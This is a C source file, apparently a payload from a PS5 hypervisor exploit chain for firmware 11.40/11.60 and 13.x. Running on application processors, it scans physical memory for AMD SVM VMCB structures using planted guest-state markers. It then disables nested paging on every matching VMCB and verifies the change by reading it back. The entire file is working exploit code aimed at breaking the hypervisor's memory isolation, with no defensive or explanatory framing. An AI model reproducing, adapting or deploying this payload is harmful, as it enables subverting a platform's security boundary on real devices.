#include <stdint.h>

/* VMCB structural fields (AMD SVM, PS5 layout) */
#define VMCB_IOPM_BASE_PA  0x40
#define VMCB_MSRPM_BASE_PA 0x48
#define VMCB_ASID          0x58
#define VMCB_NESTED_CTRL   0x90
#define VMCB_NESTED_CR3    0xB0
#define VMCB_CLEAN         0xC0
#define VMCB_GUEST_CR3     0x550
#define VMCB_GUEST_RIP     0x578

/* AP payload mode tag and result markers (contract with resume_hook_1140.c). */
#define AP_MODE_1160 0x313631312D504142ULL /* "BAP-1161" */
#define MARK_ENTERED 0x454E544552454431ULL /* "ENTERED1" */
#define MARK_DONE    0x444F4E452D415031ULL /* "DONE-AP1" */
#define MODE_STRIKE  0x31454B4952545356ULL /* "VSTRIKE1" */

/* param[] layout for the 11.60/11.40 runtime discovery mode:
 *   [0] startup_mp init vector (first AP instruction, used by entry.S)
 *   [1] dmap base
 *   [2] oracle result block (8 qwords)
 *   [3] HV loader PA (unused by discovery, passed for reference)
 *   [4] extended stash (10 qwords)
 *   [5] needle: dmap VA of this AP's payload page
 *   [6] needle: injected guest CR3 of this AP
 *   [7] mode tag (AP_MODE_1160 for discovery, 0 for legacy) */

#define read64(p)           (*(volatile uint64_t *)(uintptr_t)(p))
#define read32(p)           (*(volatile uint32_t *)(uintptr_t)(p))
#define write64(p, v)       (*(volatile uint64_t *)(uintptr_t)(p) = (uint64_t)(v))
#define write32(p, v)       (*(volatile uint32_t *)(uintptr_t)(p) = (uint32_t)(v))

static __attribute__((noinline)) void vmcb_write64(uint64_t p, uint64_t v)
{
  write64(p, v);
}

static __attribute__((noinline)) void vmcb_write32(uint64_t p, uint32_t v)
{
  write32(p, v);
}

/* ------------------------------------------------------------------ */
/* 11.60/11.40: runtime VMCB discovery                                  */
/*                                                                      */
/* The 13.x heap/pcpu globals are zero during the startup AP window,    */
/* so the live VMCBs are located structurally instead:                  */
/*   pass 1 - find the VMCB that carries this AP's injected CR3/RIP     */
/*            (must be exactly one)                                      */
/*   pass 2 - count structurally valid VMCBs sharing its ASID           */
/*            (must be exactly 16, including the self VMCB)             */
/*   pass 3 - disable nested paging on every match (nctl &= ~1,         */
/*            clean = 0)                                                */
/*   pass 4 - read back: nctl must be 8 and clean must be 0             */
/* No hypervisor write is reachable before passes 1-2 pass.             */
/* ------------------------------------------------------------------ */

#define SCAN_LO 0x62A00000ULL
#define SCAN_HI 0x63800000ULL
#define SCAN_STEP 0x1000ULL

static int vmcb_profile_ok(uint64_t p, uint64_t asid)
{
  uint64_t nctl = read64(p + VMCB_NESTED_CTRL);
  uint64_t ncr3 = read64(p + VMCB_NESTED_CR3);
  uint64_t iopm = read64(p + VMCB_IOPM_BASE_PA);

  return nctl == 9 &&
         read32(p + VMCB_ASID) == asid &&
         (ncr3 & 0xfff) == 0 && ncr3 >= SCAN_LO && ncr3 < SCAN_HI &&
         (iopm & 0xfff) == 0 && iopm >= SCAN_LO && iopm < SCAN_HI;
}

static void vmcb_disable_np_1160(uint64_t *param)
{
  const uint64_t dmap = param[1];
  const uint64_t needle_rip = param[5];
  const uint64_t needle_cr3 = param[6];
  volatile uint64_t *result = (volatile uint64_t *)(uintptr_t)param[2];
  volatile uint64_t *ext = (volatile uint64_t *)(uintptr_t)param[4];

  uint64_t self_pa = 0, self_count = 0;
  uint64_t self_nctl = 0, self_ncr3 = 0, self_iopm = 0, self_msrpm = 0;
  uint64_t self_asid = 0;
  uint64_t targets = 0, self_selected = 0, written = 0, verified = 0;
  uint64_t error = 0;

  result[0] = MARK_ENTERED;
  result[1] = MODE_STRIKE;

  /* Pass 1: this AP's own VMCB, by its injected guest state. */
  for (uint64_t pa = SCAN_LO; pa < SCAN_HI; pa += SCAN_STEP) {
    uint64_t p = dmap + pa;
    if (read64(p + VMCB_GUEST_CR3) == needle_cr3 &&
        read64(p + VMCB_GUEST_RIP) == needle_rip) {
      if (self_count++ == 0) {
        self_pa = pa;
        self_nctl = read64(p + VMCB_NESTED_CTRL);
        self_ncr3 = read64(p + VMCB_NESTED_CR3);
        self_asid = read32(p + VMCB_ASID);
        self_iopm = read64(p + VMCB_IOPM_BASE_PA);
        self_msrpm = read64(p + VMCB_MSRPM_BASE_PA);
      }
    }
  }

  if (self_count != 1) {
    error = 1;
  } else if (self_nctl != 9 || self_asid == 0 || self_asid >= 16 ||
             (self_ncr3 & 0xfff) != 0 || self_ncr3 < SCAN_LO ||
             self_ncr3 >= SCAN_HI || (self_iopm & 0xfff) != 0 ||
             self_iopm < SCAN_LO || self_iopm >= SCAN_HI) {
    error = 2;
  }

  /* Pass 2: exactly sixteen structurally valid VMCBs, same ASID. */
  if (error == 0) {
    for (uint64_t pa = SCAN_LO; pa < SCAN_HI; pa += SCAN_STEP) {
      if (vmcb_profile_ok(dmap + pa, self_asid)) {
        targets++;
        if (pa == self_pa)
          self_selected = 1;
      }
    }
    if (targets != 16)
      error = 3;
    else if (!self_selected)
      error = 4;
  }

  /* Pass 3: the strike. Pass 4: readback verification. */
  if (error == 0) {
    for (uint64_t pa = SCAN_LO; pa < SCAN_HI; pa += SCAN_STEP) {
      uint64_t p = dmap + pa;
      if (vmcb_profile_ok(p, self_asid)) {
        vmcb_write64(p + VMCB_NESTED_CTRL,
                     read64(p + VMCB_NESTED_CTRL) & ~1ULL);
        vmcb_write32(p + VMCB_CLEAN, 0);
        written++;
      }
    }
    for (uint64_t pa = SCAN_LO; pa < SCAN_HI; pa += SCAN_STEP) {
      uint64_t p = dmap + pa;
      if (read64(p + VMCB_NESTED_CTRL) == 8 &&
          read32(p + VMCB_ASID) == self_asid &&
          (read64(p + VMCB_NESTED_CR3) & 0xfff) == 0 &&
          read64(p + VMCB_NESTED_CR3) >= SCAN_LO &&
          read64(p + VMCB_NESTED_CR3) < SCAN_HI &&
          (read64(p + VMCB_IOPM_BASE_PA) & 0xfff) == 0 &&
          read64(p + VMCB_IOPM_BASE_PA) >= SCAN_LO &&
          read64(p + VMCB_IOPM_BASE_PA) < SCAN_HI &&
          read32(p + VMCB_CLEAN) == 0)
        verified++;
    }
    if (written != 16 || verified != 16)
      error = 5;
  }

  ext[0] = error;
  ext[1] = self_pa;
  ext[2] = self_count;
  ext[3] = targets;
  ext[4] = self_ncr3;
  ext[5] = self_asid;
  ext[6] = self_iopm;
  ext[7] = self_msrpm;
  ext[8] = written;
  ext[9] = verified;
  result[2] = self_pa;
  result[5] = error;
  result[6] = written;
  result[7] = verified;
  result[3] = MARK_DONE;
}

/* ------------------------------------------------------------------ */
/* 13.x legacy path: fixed heap/pcpu globals, pcpu - heap + 0xA8.       */
/* ------------------------------------------------------------------ */

static void vmcb_disable_np_legacy(uint64_t *param)
{
  uint64_t dmap        = param[1];
  uint64_t hv_heap_off = param[4];
  uint64_t pcpus       = param[5];

  write64(param[2], 0xcafedead00001337ULL);

  uint64_t heap = read64(dmap + hv_heap_off);

  for (int core = 0; core < 16; core++) {
    uint64_t pcpu = read64(dmap + pcpus + (uint64_t)core * sizeof(uint64_t));
    if (!pcpu)
      continue;
    uint64_t vmcb = read64(dmap + (pcpu - heap) + 0xa8);
    if (!vmcb)
      continue;

    uint64_t vpa = vmcb - heap;
    uint64_t old = read64(dmap + vpa + VMCB_NESTED_CTRL);

    write64(dmap + vpa + VMCB_NESTED_CTRL, old & ~1);  // disable NPT
    write32(dmap + vpa + VMCB_CLEAN, 0);               // force reload
  }
}

void vmcb_disable_np(uint64_t *param)
{
  if (param[7] == AP_MODE_1160)
    vmcb_disable_np_1160(param);
  else
    vmcb_disable_np_legacy(param);
}
